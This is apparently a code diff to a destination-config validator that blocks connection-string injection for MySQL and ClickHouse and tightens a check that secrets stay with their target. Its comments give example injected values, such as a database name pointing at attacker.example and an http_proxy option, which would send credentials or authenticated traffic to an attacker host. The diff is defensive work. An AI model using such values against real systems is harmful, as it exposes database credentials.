@@ -308,7 +308,11 @@ function findChangedTargets(node: any, original: any, path: (string | number)[],
 // - MySQL: `user:password@tcp(host:port)/database`, split by the driver at its last '@' and '/'. A database such as
 //   `x@tcp(attacker.example:3306)/events` connects to that address and sends it a password starting with the stored one.
 //   (A username cannot move the connection that way, and `user@server` usernames are legitimate, so only `database`.)
-// Bulker now quotes or avoids the string (JITSU-270), but a console talking to an older Bulker must not rely on that.
+// - ClickHouse: `protocol://user:password@hosts/database?param=value`, with the database put in as it is. A `?` starts
+//   the query string, so `events?http_proxy=http://attacker.example:8080` sets a driver option that carries the
+//   authenticated requests through that proxy.
+// Bulker now quotes or avoids the string (JITSU-270; ClickHouse is not covered there), but a console talking to an older
+// Bulker must not rely on that.
 const CONNECTION_STRING_TYPES: Record<string, { fields: string[]; breaker: RegExp; what: string }> = {
   postgres: {
     fields: ["database", "username", "defaultSchema"],
@@ -321,10 +325,11 @@ const CONNECTION_STRING_TYPES: Record<string, { fields: string[]; breaker: RegEx
     what: "a space, quote or backslash",
   },
   mysql: { fields: ["database"], breaker: /[@/?]/, what: "@, / or ?" },
+  clickhouse: { fields: ["database"], breaker: /[?&#]/, what: "?, & or #" },
 };
 
 /**
- * Fields of a Postgres, Redshift or MySQL destination whose value would split or move the connection string, and what
+ * Fields of a Postgres, Redshift, MySQL or ClickHouse destination whose value would split or move the connection string, and what
  * is wrong with them. Whitespace at either end is ignored: it cannot start a setting (the Postgres reader skips it
  * after `=` and ends the value at it), and a stored schema with a leading space exists in production and has always
  * worked.
@@ -429,7 +434,9 @@ export function assertSecretsStayWithTarget(original: any, patch: any, merged: a
     if (isEmptyValue(stored)) {
       return false;
     }
-    const supplied = get(patch, path);
+    // Walk the path one segment at a time. A string path would let a property literally named `credentials.password`
+    // in the patch count as the nested secret (lodash prefers it), while the stored password is kept.
+    const supplied = get(patch, String(path).split("."));
     return isEmptyValue(supplied) || supplied === MASKED_SECRET;
   });
   if (keptSecrets.length > 0) {
